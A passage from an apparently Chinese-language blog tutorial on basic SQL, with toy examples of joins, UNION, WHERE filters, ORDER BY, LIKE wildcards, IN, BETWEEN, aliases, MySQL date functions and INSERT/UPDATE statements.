table2.employee_id;<br></code></pre></td></tr></table></figure><p>右</p><table><thead><tr><th>department_id</th><th>employee_id</th><th>name</th></tr></thead><tbody><tr><td>101</td><td>1</td><td>Alice</td></tr><tr><td>NULL</td><td>2</td><td>Bob</td></tr></tbody></table><p>左：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> table1.employee_id, table1.name, table2.department_id<br><span class="hljs-keyword">FROM</span> table1<br><span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> table2 <br><span class="hljs-keyword">ON</span> table1.employee_id <span class="hljs-operator">=</span> table2.employee_id;<br></code></pre></td></tr></table></figure><table><thead><tr><th>employee_id</th><th>name</th><th>department_id</th></tr></thead><tbody><tr><td>1</td><td>Alice</td><td>101</td></tr><tr><td>2</td><td>Bob</td><td>NULL</td></tr></tbody></table><h6 id="使用-UNION："><a href="#使用-UNION：" class="headerlink" title="使用 UNION："></a>使用 UNION：</h6><p>合并两个查询的结果，去除重复的行，可以使用 <code>UNION</code>：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> 表<span class="hljs-number">1</span><br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> 表<span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>例子:</p><p><code>表1</code> 的数据如下：</p><table><thead><tr><th>ID</th><th>Name</th></tr></thead><tbody><tr><td>1</td><td>Alice</td></tr><tr><td>2</td><td>Bob</td></tr></tbody></table><p><code>表2</code> 的数据如下：</p><table><thead><tr><th>ID</th><th>Name</th></tr></thead><tbody><tr><td>2</td><td>Bob</td></tr><tr><td>3</td><td>Charlie</td></tr></tbody></table><p>执行 <code>SELECT * FROM 表1 UNION SELECT * FROM 表2;</code> 后，结果会是：</p><table><thead><tr><th>ID</th><th>Name</th></tr></thead><tbody><tr><td>1</td><td>Alice</td></tr><tr><td>2</td><td>Bob</td></tr><tr><td>3</td><td>Charlie</td></tr></tbody></table><p>因为 <code>UNION</code> 会自动去掉重复的行（比如 <code>Bob</code> 只出现一次，虽然在 <code>表1</code> 和 <code>表2</code> 中都存在）。</p><p>注意：<code>UNION</code> 会自动去除重复记录。如果你希望保留重复记录，可以使用 <code>UNION ALL</code>。</p><p>如果你希望保留重复的行，可以使用 <code>UNION ALL</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> 表<span class="hljs-number">1</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> 表<span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>结果将是：</p><table><thead><tr><th>ID</th><th>Name</th></tr></thead><tbody><tr><td>1</td><td>Alice</td></tr><tr><td>2</td><td>Bob</td></tr><tr><td>2</td><td>Bob</td></tr><tr><td>3</td><td>Charlie</td></tr></tbody></table><p>这里，<code>Bob</code> 出现了两次，因为 <code>UNION ALL</code> 不会去重。</p><h5 id="（9）连接查询"><a href="#（9）连接查询" class="headerlink" title="（9）连接查询"></a>（9）连接查询</h5><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">SELECT</span> <span class="hljs-params">...</span> FROM tableA  <span class="hljs-keyword">JOIN</span> tableB <span class="hljs-keyword">ON</span> tableA.column1 = tableB.column2;<br></code></pre></td></tr></table></figure><p><strong>解释</strong>：</p><ol><li>**<code>SELECT ...</code>**：这部分是你想要查询的列。你可以选择从 <code>tableA</code> 和 <code>tableB</code> 中提取的字段，或者使用 <code>*</code> 来选择所有列。</li><li>**<code>FROM tableA</code>**：指定第一个表 <code>tableA</code> 作为查询的数据源。</li><li>**<code>JOIN tableB</code>**：这是连接操作，将 <code>tableA</code> 和 <code>tableB</code> 这两个表连接在一起。默认使用的是 <code>INNER JOIN</code>，意味着只有在两个表中都有匹配记录时，才会包含这些记录。</li><li>**<code>ON tableA.column1 = tableB.column2</code>**：这是连接条件，表示表 <code>tableA</code> 的 <code>column1</code> 列与表 <code>tableB</code> 的 <code>column2</code> 列进行比较，只有当这两个列的值相等时，相关的行才会出现在查询结果中。</li></ol><p><strong>例子：</strong></p><p>假设有两个表：</p><p><code>tableA</code>（员工表）：</p><table><thead><tr><th>ID</th><th>Name</th><th>DepartmentID</th></tr></thead><tbody><tr><td>1</td><td>Alice</td><td>10</td></tr><tr><td>2</td><td>Bob</td><td>20</td></tr><tr><td>3</td><td>Charlie</td><td>10</td></tr></tbody></table><p><code>tableB</code>（部门表）：</p><table><thead><tr><th>DepartmentID</th><th>DepartmentName</th></tr></thead><tbody><tr><td>10</td><td>HR</td></tr><tr><td>20</td><td>IT</td></tr><tr><td>30</td><td>Finance</td></tr></tbody></table><p>执行以下查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> tableA.Name, tableB.DepartmentName<br><span class="hljs-keyword">FROM</span> tableA<br><span class="hljs-keyword">JOIN</span> tableB<br><span class="hljs-keyword">ON</span> tableA.DepartmentID <span class="hljs-operator">=</span> tableB.DepartmentID;<br></code></pre></td></tr></table></figure><p><strong>结果：</strong></p><table><thead><tr><th>Name</th><th>DepartmentName</th></tr></thead><tbody><tr><td>Alice</td><td>HR</td></tr><tr><td>Bob</td><td>IT</td></tr><tr><td>Charlie</td><td>HR</td></tr></tbody></table><h5 id="（10）合并查询"><a href="#（10）合并查询" class="headerlink" title="（10）合并查询"></a>（10）合并查询</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span>(s) <span class="hljs-keyword">FROM</span> table1<br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span>(s) <span class="hljs-keyword">FROM</span> table2;<br></code></pre></td></tr></table></figure><p><strong>解释：</strong></p><ol><li>**<code>SELECT column_name(s) FROM table1</code>**：这个部分用于从 <code>table1</code> 表中提取指定的列（<code>column_name(s)</code> 可以是一个或多个列的名称）。这将生成一个结果集。</li><li><strong><code>UNION</code> 操作符</strong>：<code>UNION</code> 用于合并两个 <code>SELECT</code> 查询的结果集，并自动去除重复的行。如果希望保留所有重复行，则可以使用 <code>UNION ALL</code>。</li><li>**<code>SELECT column_name(s) FROM table2</code>**：这个部分从 <code>table2</code> 表中提取相同的列（<code>column_name(s)</code>），并将结果与第一个 <code>SELECT</code> 查询的结果合并。</li></ol><p>例子：</p><p>假设有以下两个表：</p><p><strong>table1</strong>：</p><table><thead><tr><th>id</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>Alice</td></tr><tr><td>2</td><td>Bob</td></tr></tbody></table><p><strong>table2</strong>：</p><table><thead><tr><th>id</th><th>name</th></tr></thead><tbody><tr><td>2</td><td>Bob</td></tr><tr><td>3</td><td>Charlie</td></tr></tbody></table><p>执行以下查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id, name <span class="hljs-keyword">FROM</span> table1<br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">SELECT</span> id, name <span class="hljs-keyword">FROM</span> table2;<br></code></pre></td></tr></table></figure><p>结果将是：</p><table><thead><tr><th>id</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>Alice</td></tr><tr><td>2</td><td>Bob</td></tr><tr><td>3</td><td>Charlie</td></tr></tbody></table><p>如你所见，<code>UNION</code> 去除了重复的 <code>(2, Bob)</code> 行。</p><h5 id="（11）AND-OR-运算符用于基于一个以上的条件对记录进行过滤。"><a href="#（11）AND-OR-运算符用于基于一个以上的条件对记录进行过滤。" class="headerlink" title="（11）AND &amp; OR 运算符用于基于一个以上的条件对记录进行过滤。"></a>（11）AND &amp; OR 运算符用于基于一个以上的条件对记录进行过滤。</h5><p>AND 和 OR 运算符用于 SQL 中的 WHERE 子句，以基于多个条件来过滤记录。</p><ol><li><p><strong>AND 运算符</strong></p><p> AND 用于在查询中定义必须同时满足的多个条件。<br> 只有当所有条件都为真时，查询才会返回该记录。</p></li></ol><p>示例：</p><p>假设有一个 employees 表，其中包含 age 和 department 列：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> employees<br><span class="hljs-keyword">WHERE</span> age &gt; <span class="hljs-number">30</span><br><span class="hljs-keyword">AND</span> department = <span class="hljs-string">&#x27;Sales&#x27;</span>;<br></code></pre></td></tr></table></figure><p>在这个查询中，只有那些年龄大于 30 且部门是销售部 (Sales) 的员工会被选中。<br>2. <strong>OR 运算符</strong></p><pre><code class="hljs">OR 用于在查询中定义只需满足一个条件即可的多个条件。只要任一条件为真，该记录就会被返回。</code></pre><p>eg：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> employees<br><span class="hljs-keyword">WHERE</span> age &gt; <span class="hljs-number">30</span><br><span class="hljs-keyword">OR</span> department = <span class="hljs-string">&#x27;Sales&#x27;</span>;<br></code></pre></td></tr></table></figure><p>在这个查询中，年龄大于 30 的员工或部门为销售部的员工将会被选中。<br>组合使用 AND 和 OR</p><p>在复杂查询中，可以同时使用 AND 和 OR，但要注意运算符的优先级。通常使用括号 () 来明确条件分组，避免误解。</p><p>示例：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> employees<br><span class="hljs-keyword">WHERE</span> (age &gt; <span class="hljs-number">30</span> <span class="hljs-keyword">AND</span> department = <span class="hljs-string">&#x27;Sales&#x27;</span>)<br><span class="hljs-keyword">OR</span> (age &lt; <span class="hljs-number">25</span> <span class="hljs-keyword">AND</span> department = <span class="hljs-string">&#x27;Marketing&#x27;</span>);<br></code></pre></td></tr></table></figure><p>在这个查询中，将会返回年龄大于 30 且在销售部，或年龄小于 25 且在市场部的员工。</p><h5 id="（12）WHERE-子句用于过滤记录。"><a href="#（12）WHERE-子句用于过滤记录。" class="headerlink" title="（12）WHERE 子句用于过滤记录。"></a>（12）WHERE 子句用于过滤记录。</h5><p><strong>SQL WHERE 语法</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column1, column2, ...<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">condition</span><br></code></pre></td></tr></table></figure><p>例子：</p><p><img src="/2024/11/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/411b227d3753acc45155b5048a44d52.png" alt="411b227d3753acc45155b5048a44d52"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Websites <span class="hljs-keyword">WHERE</span> country<span class="hljs-operator">=</span><span class="hljs-string">&#x27;CN&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1.jpg" alt="img"></p><p>SQL 使用单引号来环绕文本值（大部分数据库系统也接受双引号）。</p><p>在上个实例中 ‘CN’ 文本字段使用了单引号。</p><p>如果是数值字段，请不要使用引号。</p><h5 id="（13）ORDER-BY-关键字用于对结果集进行排序。"><a href="#（13）ORDER-BY-关键字用于对结果集进行排序。" class="headerlink" title="（13）ORDER BY 关键字用于对结果集进行排序。"></a>（13）ORDER BY 关键字用于对结果集进行排序。</h5><p>ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序。</p><p>ORDER BY 关键字默认按照升序对记录进行排序。如果需要按照降序对记录进行排序，您可以使用 DESC 关键字。</p><p><strong>SQL ORDER BY 语法</strong>:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column1, column2, ...<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> column1, column2, ... <span class="hljs-keyword">ASC</span><span class="hljs-operator">|</span><span class="hljs-keyword">DESC</span>;<br></code></pre></td></tr></table></figure><ul><li>**column1, column2, …**：要排序的字段名称，可以为多个字段。</li><li><strong>ASC</strong>：表示按升序排序。</li><li><strong>DESC</strong>：表示按降序排序。</li></ul><p>例子：</p><p><img src="/2024/11/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/02b7c15bcecab1cc5efe2631cff8981.png" alt="02b7c15bcecab1cc5efe2631cff8981"></p><p>下面的 SQL 语句从 “Websites” 表中选取所有网站，并按照 “alexa” 列降序排序：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> Websites<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> alexa <span class="hljs-keyword">DESC</span>;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/orderby1.jpg" alt="orderby1"></p><p><strong>ORDER BY多列：</strong></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> Websites<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> country,alexa;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/orderby3.jpg" alt="orderby3"></p><h5 id="（14）LIKE-操作符用于在-WHERE-子句中搜索列中的指定模式。"><a href="#（14）LIKE-操作符用于在-WHERE-子句中搜索列中的指定模式。" class="headerlink" title="（14）LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。"></a>（14）LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。</h5><h5 id="（15）通配符可用于替代字符串中的任何其他字符。（-：替代-0-个或多个字符，-：替代一个字符）"><a href="#（15）通配符可用于替代字符串中的任何其他字符。（-：替代-0-个或多个字符，-：替代一个字符）" class="headerlink" title="（15）通配符可用于替代字符串中的任何其他字符。（%：替代 0 个或多个字符，_：替代一个字符）"></a>（15）通配符可用于替代字符串中的任何其他字符。（%：替代 0 个或多个字符，_：替代一个字符）</h5><p><strong>语法：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column1, column2, ...<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">WHERE</span> column_name <span class="hljs-keyword">LIKE</span> <span class="hljs-keyword">pattern</span>;<br></code></pre></td></tr></table></figure><p>参数说明：</p><ul><li>**column1, column2, …**：要选择的字段名称，可以为多个字段。如果不指定字段名称，则会选择所有字段。</li><li><strong>table_name</strong>：要查询的表名称。</li><li><strong>column</strong>：要搜索的字段名称。</li><li><strong>pattern</strong>：搜索模式。</li></ul><p><strong>通配符</strong></p><ul><li><code>%</code>：匹配任意字符（包括零个字符）。</li><li><code>_</code>：匹配单个字符。</li></ul><p>例子：</p><table><thead><tr><th>ProductID</th><th>ProductName</th><th>Category</th></tr></thead><tbody><tr><td>1</td><td>iPhone 12</td><td>Electronics</td></tr><tr><td>2</td><td>Samsung Galaxy S21</td><td>Electronics</td></tr><tr><td>3</td><td>Dell XPS 13</td><td>Electronics</td></tr><tr><td>4</td><td>Nike Air Zoom</td><td>Footwear</td></tr><tr><td>5</td><td>Adidas Ultraboost</td><td>Footwear</td></tr><tr><td>6</td><td>Sony PlayStation 5</td><td>Electronics</td></tr></tbody></table><p>使用 % 通配符找出所有以 “iPhone” 开头的产品：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> ProductName, Category<br><span class="hljs-keyword">FROM</span> Products<br><span class="hljs-keyword">WHERE</span> ProductName <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;iPhone%&#x27;</span>;<br></code></pre></td></tr></table></figure><p>返回以下数据：</p><table><thead><tr><th>ProductName</th><th>Category</th></tr></thead><tbody><tr><td>iPhone 12</td><td>Electronics</td></tr></tbody></table><p>使用 _ 通配符找出所有产品名称为三个字符，第一个字符为 “D”，第二个字符为 “e” 的产品：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> ProductName, Category<br><span class="hljs-keyword">FROM</span> Products<br><span class="hljs-keyword">WHERE</span> ProductName <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;De_&#x27;</span>;<br></code></pre></td></tr></table></figure><p>返回以下数据：</p><table><thead><tr><th>ProductName</th><th>Category</th></tr></thead><tbody><tr><td>Dell XPS 13</td><td>Electronics</td></tr></tbody></table><p>结合 % 和 _ 通配符找出所有产品名称包含 “Zoom” 的产品：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> ProductName, Category<br><span class="hljs-keyword">FROM</span> Products<br><span class="hljs-keyword">WHERE</span> ProductName <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%Zoom%&#x27;</span>;<br></code></pre></td></tr></table></figure><p>返回以下数据：</p><table><thead><tr><th>ProductName</th><th>Category</th></tr></thead><tbody><tr><td>Nike Air Zoom</td><td>Footwear</td></tr></tbody></table><h5 id="（16）IN-操作符允许您在-WHERE-子句中规定多个值。"><a href="#（16）IN-操作符允许您在-WHERE-子句中规定多个值。" class="headerlink" title="（16）IN 操作符允许您在 WHERE 子句中规定多个值。"></a>（16）IN 操作符允许您在 WHERE 子句中规定多个值。</h5><p>语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column1, column2, ...<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">column</span> <span class="hljs-keyword">IN</span> (value1, value2, ...);<br><br>参数说明：<br><br>    column1, column2, ...：要选择的字段名称，可以为多个字段。如果不指定字段名称，则会选择所有字段。<br>    table_name：要查询的表名称。<br>    <span class="hljs-keyword">column</span>：要查询的字段名称。<br>    value1, value2, ...：要查询的值，可以为多个值。<br></code></pre></td></tr></table></figure><p>例子：</p><p><img src="/2024/11/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ee975546f37e16d1efffbc72d721544.png" alt="ee975546f37e16d1efffbc72d721544"></p><p>下面的 SQL 语句选取 name 为 “Google” 或 “菜鸟教程” 的所有网站：</p><p><strong>实例</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Websites<br> <span class="hljs-keyword">WHERE</span> name <span class="hljs-keyword">IN</span> (<span class="hljs-string">&#x27;Google&#x27;</span>,<span class="hljs-string">&#x27;菜鸟教程&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>IN 与 &#x3D; 的异同</strong></p><ul><li>相同点：均在WHERE中使用作为筛选条件之一、均是等于的含义</li><li>不同点：IN可以规定多个值，等于规定一个值</li><li>**<code>=</code>**：只能匹配单个值。例如，<code>WHERE column = &#39;value&#39;</code> 表示筛选出 <code>column</code> 等于 <code>&#39;value&#39;</code> 的行。</li></ul><h5 id="（17）BETWEEN-操作符用于选取介于两个值之间的数据范围内的值。"><a href="#（17）BETWEEN-操作符用于选取介于两个值之间的数据范围内的值。" class="headerlink" title="（17）BETWEEN 操作符用于选取介于两个值之间的数据范围内的值。"></a>（17）BETWEEN 操作符用于选取介于两个值之间的数据范围内的值。</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span>(s)<br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br><span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">BETWEEN</span> value1 <span class="hljs-keyword">AND</span> value2;<br></code></pre></td></tr></table></figure><h5 id="（18）别名"><a href="#（18）别名" class="headerlink" title="（18）别名"></a>（18）别名</h5><p>列的别名写法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name <span class="hljs-keyword">AS</span> alias_name<br><span class="hljs-keyword">FROM</span> table_name;<br><br>column_name：原始的列名，表示从表中选择的列。<br><span class="hljs-keyword">AS</span>：用于指定别名，<span class="hljs-keyword">AS</span> 之后的名称将作为新列名显示。<br>alias_name：列的别名，表示在结果集中显示的列的名称。<br></code></pre></td></tr></table></figure><p>表的别名写法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name(s)<br><span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">AS</span> alias_name;<br><br>table_name：原始表名。<br><span class="hljs-keyword">AS</span>：用于指定别名。<br>alias_name：表的别名，在查询中可代替表名使用。<br></code></pre></td></tr></table></figure><h5 id="（19）MySQL-Date-函数"><a href="#（19）MySQL-Date-函数" class="headerlink" title="（19）MySQL Date 函数"></a>（19）MySQL Date 函数</h5><p><strong>MySQL</strong> 使用下列数据类型在数据库中存储日期或日期&#x2F;时间值：</p><ul><li>DATE - 格式：YYYY-MM-DD</li><li>DATETIME - 格式：YYYY-MM-DD HH:MM:SS</li><li>TIMESTAMP - 格式：YYYY-MM-DD HH:MM:SS</li><li>YEAR - 格式：YYYY 或 YY</li></ul><p>下面的表格列出了 MySQL 中最重要的内建日期函数：</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/sql/func-now.html">NOW()</a></td><td>返回当前的日期和时间  SELECT NOW() FROM table_name;</td></tr><tr><td><a href="https://www.runoob.com/sql/func-curdate.html">CURDATE()</a></td><td>返回当前的日期</td></tr><tr><td><a href="https://www.runoob.com/sql/func-curtime.html">CURTIME()</a></td><td>返回当前的时间</td></tr><tr><td><a href="https://www.runoob.com/sql/func-date.html">DATE()</a></td><td>提取日期或日期&#x2F;时间表达式的日期部分</td></tr><tr><td><a href="https://www.runoob.com/sql/func-extract.html">EXTRACT()</a></td><td>返回日期&#x2F;时间的单独部分</td></tr><tr><td><a href="https://www.runoob.com/sql/func-date-add.html">DATE_ADD()</a></td><td>向日期添加指定的时间间隔</td></tr><tr><td><a href="https://www.runoob.com/sql/func-date-sub.html">DATE_SUB()</a></td><td>从日期减去指定的时间间隔</td></tr><tr><td><a href="https://www.runoob.com/sql/func-datediff-mysql.html">DATEDIFF()</a></td><td>返回两个日期之间的天数</td></tr><tr><td><a href="https://www.runoob.com/sql/func-date-format.html">DATE_FORMAT()</a></td><td>用不同的格式显示日期&#x2F;时间</td></tr></tbody></table><h3 id="11、修改数据"><a href="#11、修改数据" class="headerlink" title="11、修改数据"></a>11、修改数据</h3><h5 id="（1）插入数据"><a href="#（1）插入数据" class="headerlink" title="（1）插入数据"></a>（1）插入数据</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">INSERT</span> INTO &lt;表名&gt; (字段<span class="hljs-number">1</span>, 字段<span class="hljs-number">2</span>, ...) VALUES (值<span class="hljs-number">1</span>, 值<span class="hljs-number">2</span>, ...);<br></code></pre></td></tr></table></figure><p>假设有一个名为 <code>employees</code> 的表，包含以下字段：</p><ul><li><code>id</code>：员工编号</li><li><code>first_name</code>：员工名字</li><li><code>last_name</code>：员工姓氏</li><li><code>age</code>：员工年龄</li></ul><p><strong>可以使用 <code>INSERT INTO</code> 语句向 <code>employees</code> 表中插入一行新数据：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> employees (id, first_name, last_name, age) <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;John&#x27;</span>, <span class="hljs-string">&#x27;Doe&#x27;</span>, <span class="hljs-number">30</span>);<br></code></pre></td></tr></table></figure><p><strong>简化</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> employees <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;John&#x27;</span>, <span class="hljs-string">&#x27;Doe&#x27;</span>, <span class="hljs-number">30</span>);<br></code></pre></td></tr></table></figure><h5 id="（2）更新数据"><a href="#（2）更新数据" class="headerlink" title="（2）更新数据"></a>（2）更新数据</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">UPDATE &lt;表名&gt; <span class="hljs-built_in">SET</span> 字段<span class="hljs-attribute">1</span>=值1, 字段<span class="hljs-attribute">2</span>=值2  WHERE &lt;条件表达式&gt;;<br></code></pre></td></tr></table></figure><p>假设有一个名为 <code>employees</code> 的表，包含以下字段：</p><ul><li><code>id</code>：员工编号</li><li><code>first_name</code>：员工名字</li><li><code>last_name</code>：员工姓氏</li><li><code>salary</code>：员工工资</li></ul><p>如果想要将 <code>id</code> 为 <code>1</code> 的员工的名字修改为 <code>&#39;Jane&#39;</code>，并将工资更新为 <code>5000</code>，可以使用以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> employees <span class="hljs-keyword">SET</span> first_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Jane&#x27;</span>, salary <span class="hljs-operator">=</span> <span class="hljs-number">5000</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><h5 id="（3）删除数据"><a href="#（3）删除数据" class="headerlink" title="（3）删除数据"></a>（3）删除数据</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> &lt;表名&gt; <span class="hljs-keyword">WHERE</span> &lt;条件表达式&gt;;<br></code></pre></td></tr></table></figure><p>假设有一个名为 <code>employees</code> 